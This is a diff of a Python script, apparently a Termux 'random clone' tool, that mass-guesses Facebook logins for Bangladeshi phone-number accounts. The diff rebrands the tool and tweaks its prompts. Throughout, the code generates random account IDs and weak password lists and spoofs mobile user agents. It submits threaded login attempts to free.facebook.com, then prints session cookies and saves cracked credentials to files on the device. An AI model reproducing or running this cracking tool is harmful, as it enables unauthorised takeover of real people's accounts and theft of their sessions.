@@ -1,7 +1,4 @@
-# NAME : BK-HUNTER
-# GITHUB : https://github.com/HUNTER-130
-# FB GROUP : FB-CRACK_TERMUX ALL FREE COMMAND
-# FB ID : MD JAHIDUL ISLAM 
+import os
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
@@ -19,6 +16,7 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
+    os.system('pkg install espeak')
 RED = '\033[1;91m'
 WHITE = '\033[1;97m'
 GREEN = '\033[1;32m' 
@@ -57,19 +55,8 @@ ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
-def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.loop = 0
-try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
- open('.prox.txt','w').write(prox)
-except Exception as e:
- print('')
-prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
-    a='Nokia'
+    a='oppo'
     b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     c=random.randrange(1, 99)
     d='/GoBrowser/'
@@ -77,131 +64,93 @@ for xd in range(10000):
     f=random.randrange(1, 99)
     uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
-for ua in range(5000):
-      a='Mozilla/5.0 (Linux; Android'
-      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
-      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
-      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-      d=random.randrange(40,115)
-      e='0'
-      f=random.randrange(3000,6000)
-      g=random.randrange(20,100)
-      h='Mobile Safari/537.36'
-      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
-      ugen.append(ug)
-for ua in range(5000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12','13','14','15'])
-	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
-	h='Mobile Safari/537.36'
-	alhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(alhaj)
-for ua in range(5000):
-    a='NokiaX'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    alhaj=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-    ugen.append(alhaj)
-
-for ua in range(5000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12','13','14','15'])
-	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
-	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
-	h='Mobile Safari/537.36'
-	alhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(alhaj)
-os.system("xdg-open https://www.facebook.com/Black.mafia.420.Rd?mibextid=ZbWKwL")
-# LOGO
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
 logo = ("""
+███████ ██      ██ ████████ ███████ 
+██      ██      ██    ██    ██      
+█████   ██      ██    ██    █████   
+██      ██      ██    ██    ██      
+███████ ███████ ██    ██    ███████    V.1
+\033[1;30m───────────────────────────────────────────
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : BK VAI           
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : BK VAI           
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE            
+\033[1;30m───────────────────────────────────────────""")
 
- 
- .----------------.  .----------------.  .----------------.  .----------------. 
-| .--------------. || .--------------. || .--------------. || .--------------. |
-| |  _________   | || |      __      | || |    _______   | || |  _________   | |
-| | |_   ___  |  | || |     /  \     | || |   /  ___  |  | || | |  _   _  |  | |
-| |   | |_  \_|  | || |    / /\ \    | || |  |  (__ \_|  | || | |_/ | | \_|  | |
-| |   |  _|      | || |   / ____ \   | || |   '.___`-.   | || |     | |      | |
-| |  _| |_       | || | _/ /    \ \_ | || |  |`\____) |  | || |    _| |_     | |
-| | |_____|      | || ||____|  |____|| || |  |_______.'  | || |   |_____|    | |
-| |              | || |              | || |              | || |              | |
-| '--------------' || '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'  '----------------'  '----------------'
- print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32m=FACEBOOK -MD JAHIDUL ISLAM 
-# MAIN MANU 
+logo1 = ("""
+███████ ██      ██ ████████ ███████ 
+██      ██      ██    ██    ██      
+█████   ██      ██    ██    █████   
+██      ██      ██    ██    ██      
+███████ ███████ ██    ██    ███████    V.1
+\033[1;30m───────────────────────────────────────────
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : BK VAI           
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : BK VAI         
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE            
+\033[1;30m───────────────────────────────────────────""")
+
+def BKsexyx():
+	print('•────────────────•°•❀•°•────────────────•')
+
 def Main():
         os.system("clear")
+        os.system('xdg-open ')
+        os.system('espeak -a 300 "WELCOME TO BK RANDOM TOOLS"')
         print(logo)
-        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mRANDOM CLONE BD")
-        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;32mCONTACT ADMIN")
-        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT")
-        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        Alhaj =input("\n \033[1;35m[😈\033[1;35m] \033[1;32mSELECTED YOUR OPTION : ")
-        if Alhaj in ["1","01"]:
-            sexy()
-        if Alhaj in ["2","02"]:
-        	os.system('xdg-open https://wa.me/+8801616548697')
-        if Alhaj in [" 0", "00"]:
+        print(" \x1b[0m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
+        print(" \x1b[1;94m[0] Exit")
+        BKsexy =input("\n \x1b[1;96m[?] Choose : ")
+        if BKsexy in ["1","01"]:
+            fuck()
+        if BKsexy in [" 0", "00"]:
             exit()
         else:
-            exit()     
-def sexy():
+            exit()
+            
+def fuck():
     user=[]
     os.system('clear')
+    os.system('xdg-open ')
+    os.system('espeak -a 300 "ENTER YOUR SIM CODE"')
     print(logo)
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print('\033[1;32m[😈\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m016\033[1;32m]\033[1;35m [\033[1;32m017\033[1;35m] \033[1;33m[\033[1;34m018\033[1;33m] \033[1;34m[\033[1;33m019\033[1;34m]')
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    code = input('\033[1;33m[😍\033[1;32m]\033[1;32m YOUR SIM CODE : ')
+    print('\n\x1b[1;94mᏴᎠ ՏᏆᎷ ᏟϴᎠᎬ ➤➤\033[1;33m+88017,\033[1;32m+88018,\033[1;34m+88019,\033[1;31m+88014,\033[1;35m88013,\033[1;33m+88016')
+    code = input('[?] CHOOSE SIM CODE : ')
     name = ''.join(random.choice(string.digits) for _ in range(2))
     cod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
+    os.system('xdg-open ')
     print(logo)
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print('\033[1;32m[😈\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m3000\033[1;32m]\033[1;35m [\033[1;32m5000\033[1;35m] \033[1;33m[\033[1;34m10000\033[1;33m] ')
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    limit = int(input('\033[1;33m[😍\033[1;32m]\033[1;32m YOUR LIMITED : '))
+    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
+    print('      \x1b[1;95m   𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐂𝐑𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓')
+    print('\n[+] EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('[?] CHOOSE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as asha:
+    with ThreadPool(max_workers=30) as yaari:
         os.system('clear')
-        print(logo)
+        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
+        print(logo1)
         tl = str(len(user))
-        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        print('\033[1;33m[😈\033[1;33m] \033[1;36mYOUR TOTAL IDS : \033[1;32m'+tl)
-        print("\033[1;33m[😈\033[1;33m] \033[1;36mYOUR SIM CODE :\033[1;32m "+code)
-        print('\033[1;33m[😈\033[1;33m]\033[1;35m PLEASE WAIT CLONING START')
-        print('\033[1;33m[😈\033[1;33m] \033[1;34mUSE FLIGHT MODE ON/OF FOR SPEED UP')
-        print('\033[1;33m[😈\033[1;33m] \033[1;35mSUPER FAST SPEED CLONING')
-        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print('[✿] Total ids: '+tl)
+        print("[✿] Your Code: "+code)
+        print('•────────────────•°•❀•°•────────────────•')
         for love in user:
             uid = code+name+cod+love
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
-            asha.submit(alh4aj,uid,pwx,tl)
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(' [😈] OK BK-OK.txt')
-    print(' [😴] CP BK-OK.txt')
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-def alh4aj(uid,pwx,tl):
+            yaari.submit(BKsexy2,uid,pwx,tl)
+    print('•────────────────•°•❀•°•────────────────•')
+    print(' [+] Crack process has been completed')
+    print(' [+] OK Ids saved in BK/OK.txt')
+    print(' [+] CP Ids saved in BK/CP.txt')
+    print('•────────────────•°•❀•°•────────────────•')
+def BKsexy2(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -210,9 +159,9 @@ def alh4aj(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r\033[1;32m[MARK-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r\033[1;92m[BK]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -223,43 +172,37 @@ def alh4aj(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-    'method': 'GET',
-    'scheme': 'https',
+            header_freefb = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    # =[ UA = PRO ]= #
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    'viewport-width': '980',}
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
+            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;33m[\033[1;32mMARK-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
-                print(f"\033[1;92m[😜] COOKIE :\033[1;95m {coki}")
-                open('/sdcard/MARK-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f"\033[1;92m[BK-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
+                open('/sdcard/BK/OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\033[1;33m[\033[1;32mMARK-CP\033[1;33m]\033[1;91m {uid}|{ps}")
-                open('/sdcard/MARK-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\033[1;94m[BK-CP☠️] {uid}|{ps}")
+                open('/sdcard/BK-OK.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
@@ -269,4 +212,3 @@ def alh4aj(uid,pwx,tl):
         pass
         
 Main()
-# END #
